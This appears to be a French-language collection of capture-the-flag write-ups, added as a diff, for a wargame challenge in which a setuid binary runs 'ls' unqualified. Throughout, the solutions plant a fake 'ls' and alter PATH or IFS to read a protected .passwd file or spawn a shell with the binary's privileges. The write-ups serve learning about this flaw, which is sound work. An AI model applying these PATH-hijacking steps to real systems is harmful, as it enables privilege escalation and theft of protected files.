@@ -1,0 +1,211 @@
+Echappements d’options avec - -
+
+echo '#!/bin/cat --' > /tmp/ls
+
+l’option — indique à cat que tout les paramètres qui viennent après sont des noms de fichiers
+
+chmod 755 /tmp/ls
+
+On rend notre faux ls executable
+
+env PATH=/tmp ./binary_setuid .passwd
+
+On lance le binaire setuid dans un env avec un PATH modifié qui va permettre d’executer notre faux ls en premier
+
+#!/bin/cat --
+/bin/cat: -lA: No such file or directory
+8a[...]T#
+
+Cat parse donc les options (-lA) comme un fichier et indique une erreur, puis lis le fichier .passwd !
+
+ou
+
+
+
+Nous devons trouver le moyen de lire le fichier .passwd en prenant en compte les options -lA
+Pour ce faire, nous allons utiliser nano pour lequel les options -lA n’empêche en rien de lire le fichier.
+
+Commençons tout d’abord par créer un dossier dans le /tmp
+
+mkdir /tmp/exploit
+
+Ensuite nous devons utiliser la même technique que dans le challenge ELF System 1, c’est-à-dire SUID, donc nous allons copier le fichier binaire de nano dans notre dossier sous le nom de ls
+
+cp /usr/bin/nano /tmp/exploit/ls
+
+Il suffit ensuite de mettre a jour la variable globale $PATH
+
+export PATH=/tmp/exploit:$PATH
+
+En enfin exécuter le script
+
+./ch12
+
+Nous serons dans le fichier.passwd ou sera afficher le texte suivant : 8a[...]T#
+
+ou
+
+
+
+La seule difficulté étant ce -lA , il suffit de ne pas le prendre en compte :
+
+    binary2@wargame01:~$ nano /tmp/ls
+
+Dans ce fichier, on écrit
+
+    cat $2
+
+Enregistrer, puis :
+
+    binary2@wargame01:~$ PATH=/tmp:$PATH
+
+En exécutant ./binary2, on obtiens le flag :
+
+    binary2@challenge02:~$ ./binary2
+    8a[...]T#
+
+ou
+
+simple code python save it into /tmp/ls
+or mkdir /tmp/dz and save it into /tmp/dz/ls
+
+#!/usr/bin/python2
+import os
+
+os.system("/bin/sh")
+
+change env variable
+
+PATH="/tmp :" or PATH="/tmp/dz :"
+
+run ./ch12
+
+app-script-ch12@challenge02:~$ ./ch12
+sh-4.2$ /bin/cat .passwd
+xxxxxxxxxxxxx
+sh-4.2$
+
+ou
+
+On commence par spoofer le binaire "ls"
+
+mkdir -p /tmp/myself
+vim /tmp/myself/ls
+
+Le contenu du script ls ne contient que ceci : (le - final est important, c’est lui qui permet de ne pas tenir compte des arguments)
+
+#! /usr/bin/python -
+
+On termine de remplacer ls par ce qu’on veut :
+
+chmod +x /tmp/myself/ls
+export PATH=/tmp/myself/:$PATH
+
+On lance l’attaque :
+
+./ch12
+
+Ca nous ouvre un interpréteur python avec les droits de ch12 et là on fait ce qu’on veut... par exemple :
+
+>>> target = "/challenge/app-script/ch12/.passwd"
+>>> with open(target) as f:
+...         print(f.read())
+...
+<flag>
+>>>
+
+ou
+
+Une autre solution : Modifier le caractère séparant les arguments avec IFS (Internal Field Separator) !
+
+Pour cela rien de très compliqué :
+
+    On crée un fichier nommé ls :
+    binary2@challenge02:/tmp$ cat > ls
+    On fait un simple cat dans notre fichier ls :
+    cat /wargame/binary/binary2/.passwd
+    Puis on modifie le PATH :
+    binary2@challenge02:~$ PATH=/tmp:$PATH
+    Enfin on modifie notre IFS par les options appelées par le ls dans level3.c :
+    binary2@challenge02:~$ IFS=-lA
+    Ainsi le séparateur deviendra -lA
+
+    On récupère le flag !
+
+    binary2@challenge02:~$ ./binary2
+    8a[...]T#
+
+ou
+
+Plus simple que les programmes en C dans ce cas là, directement le faire en shell.
+
+On écrit donc un script shell "/tmp/ls" :
+
+#!/bin/sh
+
+/bin/cat /wargame/binary/binary2/.passwd
+
+Le lien vers "cat" doit être mis en entier vu que le PATH va être écrasé. Il ne reste plus qu’à changer le PATH et à exécuter le binaire.
+
+binary2@wargame01:~$ PATH=/tmp ./binary2
+
+ou
+
+Une nouvelle attaque par liens symbolique, mais dans ce cas on ne peut pas utiliser "cat" à cause des options -lA que le binaire cat ne connait pas. Mais on peut lancer un vi avec le compte binary2cracked, et, du coup éditer le .passwd.
+
+binary2@wargame01:~$ ln -s /usr/bin/vi /tmp/ls
+binary2@wargame01:~$ PATH=/tmp
+binary2@wargame01:~$ ./binary2 
+
+On se retrouve dans fichier dans note fichier .passwd. Il faut juste savoir que l’option -A met vi en arabe, donc écrit de droite à gauche. Suffit de remettre les lettres dans le bon ordre :)
+
+Flag :
+
+8a[...]T#
+
+ou
+
+Dans /tmp/bin/, on fait un petit code C, appelé « ls ».
+
+    #include <stdio.h>
+    #include <stdlib.h>
+     
+    int main(int argc, char **argv)
+    {
+            system("cat /challenge/binary/binary2/.passwd");
+            return 0;
+    }      
+
+Télécharger
+
+Une fois compilé, on retourne dans le homedir, et on lance ./binary2 tout en ayant pris le soin d’avoir modifié le PATH :
+
+ binary2@wargame01:~$ PATH=/tmp/bin/:$PATH ./binary2 
+ 8a[...]T#
+
+ ou
+
+ Une autre solution consiste à écrire un binaire qui va lire le fichier passé en argument numéro 2 :
+
+    #include <stdio.h>
+     
+    main(int argc, char * argv[]){
+            FILE *p_file;
+            char ligne[256];
+     
+            printf("valeur %s\n",argv[2]);
+            p_file=fopen(argv[2],"r");
+            fscanf(p_file, "%s\n",ligne);
+            printf("ligne %s\n",ligne);
+            fclose(p_file);
+            return 0;
+    }
+
+Télécharger
+
+On crée un dossier /tmp/quelconque
+on va dedans, on écrite ce programme, on le compile : gcc -o ls prog.c
+puis export PATH=/tmp/quelconque
+et on lance binary2
+
+
